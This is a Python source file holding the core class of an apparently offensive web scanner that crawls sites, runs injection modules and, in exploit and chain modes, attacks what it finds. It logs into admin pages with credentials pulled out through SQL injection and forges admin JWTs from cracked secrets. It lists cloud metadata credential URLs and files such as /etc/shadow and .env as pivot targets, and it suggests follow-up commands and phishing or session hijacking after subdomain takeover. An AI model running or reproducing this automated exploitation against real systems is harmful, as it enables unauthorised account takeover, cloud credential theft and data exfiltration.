import asyncio
import importlib
import re
from urllib.parse import urljoin, urlparse
from core.http import HttpClient, ScanCheckpoint
from core.crawler import Crawler, JSAnalyzer
from core.utils import BloomFilter, EventDispatcher


class Scanner:
    def __init__(self, targets, modules, config):
        self.original_targets = targets
        self.targets = targets.copy()
        self.module_names = modules
        self.config = config
        self.results = []
        self.modules = []
        self.crawl_results = {}
        self.http = None
        self.chain_data = {}
        self.exploited = set()
        self.checkpoint = ScanCheckpoint()
        self.collab_client = None
        self.url_filter = BloomFilter(capacity=100000, error_rate=0.001)
        self.finding_filter = BloomFilter(capacity=50000, error_rate=0.0001)
        self.payload_filter = BloomFilter(capacity=500000, error_rate=0.01)
        self.dispatcher = EventDispatcher()
        self.wordlist = None
        
        if config.get("resume") and self.checkpoint.load():
            self.results = self.checkpoint.get_findings()
    
    def _is_url_seen(self, url):
        if url in self.url_filter:
            return True
        self.url_filter.add(url)
        return False
    
    def _is_finding_duplicate(self, finding):
        key = f"{finding.get('module')}:{finding.get('url')}:{finding.get('parameter')}:{finding.get('description')}"
        if key in self.finding_filter:
            return True
        self.finding_filter.add(key)
        return False
    
    def is_payload_tried(self, target, param, payload):
        key = f"{target}:{param}:{payload}"
        if key in self.payload_filter:
            return True
        self.payload_filter.add(key)
        return False
    
    def get_filter_stats(self):
        return {
            "url_filter": self.url_filter.stats(),
            "finding_filter": self.finding_filter.stats(),
            "payload_filter": self.payload_filter.stats(),
        }
    
    async def connect_collab(self, server_url):
        from core.collab import CollabClient
        import socket
        scanner_id = f"{socket.gethostname()}-{id(self)}"
        self.collab_client = CollabClient(server_url, scanner_id)
        return await self.collab_client.connect()
    
    async def _send_to_collab(self, finding):
        if self.collab_client and self.collab_client.connected:
            await self.collab_client.send_finding(finding)
        
    def _load_modules(self):
        for name in self.module_names:
            try:
                mod = importlib.import_module(f"modules.{name}")
                class_name = f"{name.capitalize()}Module"
                cls = getattr(mod, class_name, None)
                if cls:
                    self.modules.append(cls)
            except (ImportError, AttributeError):
                pass
    
    async def detect_tech_and_select_modules(self, target):
        from core.tech_detect import TechFingerprinter
        
        async with HttpClient(self.config) as http:
            fingerprinter = TechFingerprinter(http)
            result = await fingerprinter.fingerprint(target)
            
            recommended = set(result.get("recommended_modules", []))
            
            module_mapping = {
                "sqli": "sqli",
                "xss": "xss",
                "lfi": "lfi",
                "ssrf": "ssrf",
                "ssti": "ssti",
                "cmdi": "cmdi",
                "xxe": "xxe",
                "upload": "upload",
                "deserial": "deserial",
                "prototype": "prototype",
                "graphql": "graphql",
                "api": "apiver",
                "idor": "idor",
                "auth": "auth",
            }
            
            smart_modules = []
            for rec in recommended:
                if rec in module_mapping:
                    smart_modules.append(module_mapping[rec])
            
            return {
                "technologies": result.get("technologies", []),
                "by_category": result.get("by_category", {}),
                "recommended_modules": smart_modules,
                "count": result.get("count", 0),
            }
    
    async def run_with_smart_selection(self):
        if not self.original_targets:
            return
        
        target = self.original_targets[0]
        tech_result = await self.detect_tech_and_select_modules(target)
        
        if tech_result["recommended_modules"]:
            self.module_names = list(set(self.module_names) | set(tech_result["recommended_modules"]))
        
        async for event in self.run():
            yield event
    
    def get_all_targets(self):
        return self.targets
    
    async def crawl_targets(self):
        from core.utils import TargetWordlist
        combined_wordlist = TargetWordlist()
        
        async with HttpClient(self.config) as http:
            self.http = http
            
            for target in self.original_targets:
                crawler = Crawler(http, self.config)
                result = await crawler.crawl(target)
                self.crawl_results[target] = result
                
                if result.get("wordlist"):
                    crawl_wl = result["wordlist"]
                    for word, count, sources in crawl_wl.get_words():
                        for _ in range(count):
                            combined_wordlist._add_word(word, list(sources)[0] if sources else "crawl")
                
                for url in result.get("urls", []):
                    if not self._is_url_seen(url):
                        self.targets.append(url)
                
                for endpoint in result.get("endpoints", []):
                    if not self._is_url_seen(endpoint):
                        self.targets.append(endpoint)
                
                for form in result.get("forms", []):
                    action = form.get("action")
                    if action and not self._is_url_seen(action):
                        self.targets.append(action)
                
                if result.get("js_files"):
                    js_analyzer = JSAnalyzer(http)
                    js_results = await js_analyzer.analyze(list(result["js_files"])[:20])
                    
                    for secret in js_results.get("secrets", []):
                        self.results.append({
                            "module": "js_analysis",
                            "severity": "HIGH",
                            "description": f"Secret in JS: {secret['type']}",
                            "url": secret.get("source"),
                            "parameter": None,
                            "evidence": secret.get("value"),
                            "target": target,
                        })
                    
                    for endpoint in js_results.get("endpoints", []):
                        ep = endpoint.get("endpoint", "")
                        if ep.startswith("/"):
                            full_url = urljoin(target, ep)
                            if full_url not in self.targets:
                                self.targets.append(full_url)
        
        self.wordlist = combined_wordlist
        return self.crawl_results
    
    def get_wordlist(self):
        return self.wordlist
    
    def get_mutations(self, max_mutations=1000):
        if self.wordlist:
            return self.wordlist.generate_mutations(max_mutations=max_mutations)
        return []
    
    def get_path_mutations(self, max_paths=500):
        if self.wordlist:
            return self.wordlist.generate_path_mutations(max_paths=max_paths)
        return []
    
    def get_param_mutations(self, max_params=300):
        if self.wordlist:
            return self.wordlist.generate_param_mutations(max_params=max_params)
        return []
    
    async def run(self):
        self._load_modules()
        
        chain_mode = self.config.get("chain")
        
        scan_info = {
            "targets": self.targets,
            "modules": [m.name for m in self.modules],
            "config": {k: v for k, v in self.config.items() if k not in ["cookies", "headers"]},
        }
        await self.dispatcher.emit_start(scan_info)
        
        async with HttpClient(self.config) as http:
            self.http = http
            sem = asyncio.Semaphore(self.config.get("threads", 50))
            
            async def scan_target_module(target, module_cls):
                async with sem:
                    if self.config.get("resume") and self.checkpoint.is_completed(target, module_cls.name):
                        yield {"type": "progress"}
                        return
                    
                    await self.dispatcher.emit_module_start(module_cls.name, target)
                    module_findings = []
                    exploit_mode = self.config.get("exploit", False)
                    
                    try:
                        module = module_cls(http, self.config)
                        findings = await module.scan(target)
                        for f in findings:
                            f["target"] = target
                            if self._is_finding_duplicate(f):
                                continue
                            self.results.append(f)
                            module_findings.append(f)
                            self.checkpoint.add_finding(f)
                            await self._send_to_collab(f)
                            await self.dispatcher.emit_finding(f)
                            
                            if exploit_mode and getattr(module_cls, 'exploitable', False):
                                if f.get("severity") in ["CRITICAL", "HIGH"]:
                                    exploit_key = f"{module_cls.name}:{target}:{f.get('parameter')}"
                                    if exploit_key not in self.exploited:
                                        self.exploited.add(exploit_key)
                                        try:
                                            exploit_result = await module.exploit(target, f)
                                            if exploit_result:
                                                f["exploit_data"] = exploit_result
                                                for exploit_finding in module.findings:
                                                    if "EXPLOITED" in exploit_finding.get("description", ""):
                                                        exploit_finding["target"] = target
                                                        if not self._is_finding_duplicate(exploit_finding):
                                                            self.results.append(exploit_finding)
                                                            yield {"type": "finding", **exploit_finding}
                                        except Exception as ex:
                                            if self.config.get("verbose"):
                                                yield {"type": "status", "message": f"Exploit error: {str(ex)[:40]}"}
                            
                            if chain_mode:
                                await self._process_chain_finding(http, f, target)
                            
                            yield {"type": "finding", **f}
                        
                        self.checkpoint.mark_target_complete(target, module_cls.name)
                    except Exception as e:
                        await self.dispatcher.emit_error(e, {"module": module_cls.name, "target": target})
                        if self.config.get("verbose"):
                            yield {"type": "status", "message": f"Error in {module_cls.name}: {str(e)[:50]}"}
                    
                    await self.dispatcher.emit_module_finish(module_cls.name, target, module_findings)
                    yield {"type": "progress"}
            
            for target in self.targets:
                for module_cls in self.modules:
                    async for update in scan_target_module(target, module_cls):
                        yield update
            
            if chain_mode and self.chain_data:
                async for update in self._run_chain_exploits(http):
                    yield update
        
        from core.learned import save_learned_payloads, get_learned_stats
        saved = await save_learned_payloads()
        if saved > 0:
            stats = get_learned_stats()
            yield {"type": "status", "message": f"Saved {saved} new payloads (total learned: {stats['total']})"}
        
        await self.dispatcher.emit_finish(self.results)
    
    async def _process_chain_finding(self, http, finding, target):
        module = finding.get("module", "")
        severity = finding.get("severity", "")
        evidence = finding.get("evidence", "")
        exploit_data = finding.get("exploit_data", {})
        
        if module == "ssrf" and severity in ["CRITICAL", "HIGH"]:
            self.chain_data.setdefault("ssrf_targets", []).append({
                "url": finding.get("url"),
                "evidence": evidence,
                "exploit_data": exploit_data,
            })
            if exploit_data.get("credentials"):
                self.chain_data.setdefault("cloud_creds", []).append(exploit_data["credentials"])
        
        if module == "sqli" and severity == "CRITICAL":
            if "Data Extracted" in finding.get("description", ""):
                creds = self._extract_credentials(evidence)
                if creds:
                    self.chain_data.setdefault("extracted_creds", []).extend(creds)
        
        if module == "lfi" and severity in ["CRITICAL", "HIGH"]:
            self.chain_data.setdefault("lfi_targets", []).append({
                "url": finding.get("url"),
                "parameter": finding.get("parameter"),
                "exploit_data": exploit_data,
            })
            if exploit_data.get("secrets"):
                self.chain_data.setdefault("extracted_secrets", []).extend(exploit_data["secrets"])
            if exploit_data.get("files"):
                self.chain_data.setdefault("extracted_files", {}).update(exploit_data["files"])
        
        if module == "secrets":
            if "api" in evidence.lower() or "key" in evidence.lower():
                self.chain_data.setdefault("api_keys", []).append(evidence)
        
        if module == "jwt" and "Secret Cracked" in finding.get("description", ""):
            secret_match = re.search(r"Secret: '([^']+)'", evidence)
            if secret_match:
                self.chain_data.setdefault("jwt_secrets", []).append(secret_match.group(1))
        
        if module == "subdomain" and "takeover" in finding.get("description", "").lower():
            self.chain_data.setdefault("takeover_targets", []).append({
                "subdomain": finding.get("url"),
                "service": evidence,
            })
    
    async def _run_chain_exploits(self, http):
        if "ssrf_targets" in self.chain_data:
            async for update in self._chain_ssrf_to_cloud(http):
                yield update
        
        if "cloud_creds" in self.chain_data:
            async for update in self._chain_cloud_creds(http):
                yield update
        
        if "extracted_creds" in self.chain_data:
            async for update in self._chain_creds_to_login(http):
                yield update
        
        if "extracted_secrets" in self.chain_data:
            async for update in self._chain_secrets_to_access(http):
                yield update
        
        if "lfi_targets" in self.chain_data:
            async for update in self._chain_lfi_to_secrets(http):
                yield update
        
        if "jwt_secrets" in self.chain_data:
            async for update in self._chain_jwt_to_admin(http):
                yield update
        
        if "takeover_targets" in self.chain_data:
            async for update in self._chain_subdomain_takeover(http):
                yield update
    
    async def _chain_cloud_creds(self, http):
        for creds in self.chain_data.get("cloud_creds", []):
            chain_key = f"cloud_creds_{creds.get('AccessKeyId', creds.get('access_token', ''))[:10]}"
            if chain_key in self.exploited:
                continue
            self.exploited.add(chain_key)
            
            if creds.get("AccessKeyId"):
                finding = {
                    "module": "chain_aws_exploit",
                    "severity": "CRITICAL",
                    "description": "Chain: SSRF → AWS Credentials Extracted → Full Account Access",
                    "url": "AWS Cloud",
                    "parameter": None,
                    "evidence": f"AccessKeyId: {creds.get('AccessKeyId')}, Role: {creds.get('Role', 'Unknown')}",
                    "target": "AWS",
                    "exploit_data": {
                        "type": "aws_credentials",
                        "access_key": creds.get("AccessKeyId"),
                        "secret_key_preview": creds.get("SecretAccessKey", "")[:8] + "..." if creds.get("SecretAccessKey") else None,
                        "attack_vectors": [
                            "aws s3 ls (list all buckets)",
                            "aws iam list-users (enumerate users)",
                            "aws secretsmanager list-secrets (find secrets)",
                            "aws rds describe-db-instances (find databases)",
                            "aws ec2 describe-instances (enumerate infrastructure)",
                        ]
                    }
                }
                self.results.append(finding)
                yield {"type": "finding", **finding}
            
            if creds.get("access_token"):
                finding = {
                    "module": "chain_gcp_exploit",
                    "severity": "CRITICAL",
                    "description": "Chain: SSRF → GCP Token Extracted → Cloud Access",
                    "url": "GCP Cloud",
                    "parameter": None,
                    "evidence": f"Token type: {creds.get('token_type')}",
                    "target": "GCP",
                    "exploit_data": {
                        "type": "gcp_token",
                        "token_preview": creds.get("access_token", "")[:20] + "...",
                        "attack_vectors": [
                            "gcloud projects list",
                            "gcloud compute instances list",
                            "gcloud storage ls",
                        ]
                    }
                }
                self.results.append(finding)
                yield {"type": "finding", **finding}
            
            yield {"type": "progress"}
    
    async def _chain_secrets_to_access(self, http):
        for secret in self.chain_data.get("extracted_secrets", []):
            secret_type = secret.get("type", "")
            secret_value = secret.get("value", "")
            
            chain_key = f"secret_{secret_type}_{secret_value[:10]}"
            if chain_key in self.exploited:
                continue
            self.exploited.add(chain_key)
            
            attack_vectors = []
            if secret_type in ["password", "db_password"]:
                attack_vectors = ["Database authentication", "SSH/RDP access if password reuse", "API authentication"]
            elif secret_type in ["api_key", "secret"]:
                attack_vectors = ["API access", "Third-party service access", "Data exfiltration"]
            elif secret_type in ["aws_key", "aws_secret", "aws_access_key"]:
                attack_vectors = ["AWS CLI access", "S3 bucket access", "Full cloud enumeration"]
            elif secret_type == "private_key":
                attack_vectors = ["SSH access to servers", "Code signing", "TLS impersonation"]
            
            if attack_vectors:
                finding = {
                    "module": "chain_secret_exploit",
                    "severity": "CRITICAL",
                    "description": f"Chain: LFI → Secret Extracted ({secret_type}) → Further Access",
                    "url": "Extracted from files",
                    "parameter": None,
                    "evidence": f"Type: {secret_type}, Value: {secret_value[:30]}...",
                    "target": "credentials",
                    "exploit_data": {
                        "secret_type": secret_type,
                        "attack_vectors": attack_vectors,
                    }
                }
                self.results.append(finding)
                yield {"type": "finding", **finding}
            
            yield {"type": "progress"}
    
    async def _chain_ssrf_to_cloud(self, http):
        cloud_metadata = [
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM"),
            ("http://169.254.169.254/latest/user-data", "AWS User Data"),
            ("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "AWS EC2 Creds"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP Token"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure Metadata"),
        ]
        
        for ssrf in self.chain_data.get("ssrf_targets", []):
            base_url = ssrf.get("url", "")
            
            for endpoint, name in cloud_metadata:
                chain_key = f"ssrf_cloud_{base_url}_{endpoint}"
                if chain_key in self.exploited:
                    continue
                self.exploited.add(chain_key)
                
                finding = {
                    "module": "chain_ssrf_cloud",
                    "severity": "INFO",
                    "description": f"Chain: SSRF → {name}",
                    "url": base_url,
                    "parameter": None,
                    "evidence": f"Pivot target: {endpoint}",
                    "target": base_url,
                }
                self.results.append(finding)
                yield {"type": "finding", **finding}
                yield {"type": "progress"}
    
    async def _chain_creds_to_login(self, http):
        for cred in self.chain_data.get("extracted_creds", []):
            username = cred.get("username")
            password = cred.get("password")
            
            if not username or not password:
                continue
            
            chain_key = f"creds_login_{username}"
            if chain_key in self.exploited:
                continue
            self.exploited.add(chain_key)
            
            login_endpoints = ["/login", "/admin/login", "/admin", "/api/login", "/auth/login"]
            
            for target in self.original_targets:
                parsed = urlparse(target)
                base = f"{parsed.scheme}://{parsed.netloc}"
                
                for endpoint in login_endpoints:
                    url = base + endpoint
                    
                    resp = await http.post(url, data={"username": username, "password": password})
                    
                    if resp.get("status") in [200, 302]:
                        text = resp.get("text", "").lower()
                        if "dashboard" in text or "welcome" in text or "admin" in text:
                            finding = {
                                "module": "chain_auth",
                                "severity": "CRITICAL",
                                "description": "Chain: SQLi → Creds → Admin Login",
                                "url": url,
                                "parameter": None,
                                "evidence": f"Logged in as: {username}",
                                "target": target,
                            }
                            self.results.append(finding)
                            yield {"type": "finding", **finding}
                            yield {"type": "progress"}
                            break
    
    async def _chain_lfi_to_secrets(self, http):
        secret_files = [
            "/etc/shadow",
            "/proc/self/environ",
            "/var/www/html/.env",
            "/var/www/.env",
            "/app/.env",
            "../../.env",
            "../../config/database.php",
            "../../wp-config.php",
        ]
        
        for lfi in self.chain_data.get("lfi_targets", []):
            url = lfi.get("url")
            param = lfi.get("parameter")
            
            for secret_file in secret_files:
                chain_key = f"lfi_secrets_{url}_{secret_file}"
                if chain_key in self.exploited:
                    continue
                self.exploited.add(chain_key)
                
                finding = {
                    "module": "chain_lfi_secrets",
                    "severity": "HIGH",
                    "description": f"Chain: LFI → Secret File",
                    "url": url,
                    "parameter": param,
                    "evidence": f"Try reading: {secret_file}",
                    "target": url,
                }
                self.results.append(finding)
                yield {"type": "finding", **finding}
                yield {"type": "progress"}
    
    async def _chain_jwt_to_admin(self, http):
        import json
        import base64
        import hmac
        import hashlib
        
        for secret in self.chain_data.get("jwt_secrets", []):
            chain_key = f"jwt_admin_{secret}"
            if chain_key in self.exploited:
                continue
            self.exploited.add(chain_key)
            
            admin_payload = {
                "sub": "admin",
                "admin": True,
                "role": "admin",
                "iat": 1700000000,
                "exp": 2000000000,
            }
            
            header = {"alg": "HS256", "typ": "JWT"}
            
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
            payload_b64 = base64.urlsafe_b64encode(json.dumps(admin_payload).encode()).decode().rstrip("=")
            message = f"{header_b64}.{payload_b64}"
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).decode().rstrip("=")
            
            forged_token = f"{message}.{sig}"
            
            for target in self.original_targets:
                parsed = urlparse(target)
                base = f"{parsed.scheme}://{parsed.netloc}"
                
                for endpoint in ["/api/admin", "/admin", "/dashboard", "/api/users"]:
                    url = base + endpoint
                    
                    resp = await http.get(url, headers={"Authorization": f"Bearer {forged_token}"})
                    
                    if resp.get("status") == 200:
                        text = resp.get("text", "").lower()
                        if "admin" in text or "user" in text or "data" in text:
                            finding = {
                                "module": "chain_jwt_admin",
                                "severity": "CRITICAL",
                                "description": "Chain: JWT Secret Crack → Admin Access",
                                "url": url,
                                "parameter": None,
                                "evidence": f"Forged admin JWT accepted",
                                "target": target,
                            }
                            self.results.append(finding)
                            yield {"type": "finding", **finding}
                            yield {"type": "progress"}
                            return
    
    async def _chain_subdomain_takeover(self, http):
        takeover_services = {
            "github": "https://pages.github.com",
            "heroku": "https://www.heroku.com",
            "aws/s3": "https://aws.amazon.com/s3",
            "shopify": "https://www.shopify.com",
            "fastly": "https://www.fastly.com",
            "pantheon": "https://pantheon.io",
            "tumblr": "https://www.tumblr.com",
            "wordpress": "https://wordpress.com",
            "ghost": "https://ghost.org",
        }
        
        for takeover in self.chain_data.get("takeover_targets", []):
            subdomain = takeover.get("subdomain")
            service = takeover.get("service", "").lower()
            
            chain_key = f"takeover_{subdomain}"
            if chain_key in self.exploited:
                continue
            self.exploited.add(chain_key)
            
            attack_vectors = []
            
            if "github" in service:
                attack_vectors.append("Create GitHub repo with matching CNAME to claim subdomain")
            elif "heroku" in service:
                attack_vectors.append("Create Heroku app with matching hostname")
            elif "s3" in service or "aws" in service:
                attack_vectors.append("Create S3 bucket with matching name")
            elif "shopify" in service:
                attack_vectors.append("Register Shopify store with subdomain")
            else:
                attack_vectors.append(f"Claim dangling {service} resource")
            
            attack_vectors.extend([
                "Host phishing page to steal credentials",
                "Set up session hijacking via cookie scope",
                "Serve malicious JavaScript for XSS on parent domain",
                "Bypass CSP if subdomain is whitelisted",
            ])
            
            finding = {
                "module": "chain_subdomain_takeover",
                "severity": "CRITICAL",
                "description": f"Chain: Subdomain Takeover → Multiple Attack Vectors",
                "url": subdomain,
                "parameter": None,
                "evidence": f"Service: {service} | Attacks: {', '.join(attack_vectors[:3])}",
                "target": subdomain,
            }
            self.results.append(finding)
            yield {"type": "finding", **finding}
            yield {"type": "progress"}
    
    def _extract_credentials(self, evidence):
        creds = []
        
        patterns = [
            r'(\w+):(\w+)',
            r'username[:\s]+(\w+).*password[:\s]+(\w+)',
            r'user[:\s]+(\w+).*pass[:\s]+(\w+)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, evidence, re.IGNORECASE)
            for match in matches:
                if len(match) == 2:
                    creds.append({"username": match[0], "password": match[1]})
        
        return creds
    
    def get_results(self):
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        return sorted(self.results, key=lambda x: severity_order.get(x["severity"], 5))
    
    def get_stats(self):
        stats = {
            "total_targets": len(self.targets),
            "total_findings": len(self.results),
            "by_severity": {},
            "by_module": {},
            "chains_executed": len(self.exploited),
            "dedup_stats": self.get_filter_stats(),
        }
        
        for r in self.results:
            sev = r["severity"]
            mod = r["module"]
            stats["by_severity"][sev] = stats["by_severity"].get(sev, 0) + 1
            stats["by_module"][mod] = stats["by_module"].get(mod, 0) + 1
        
        return stats
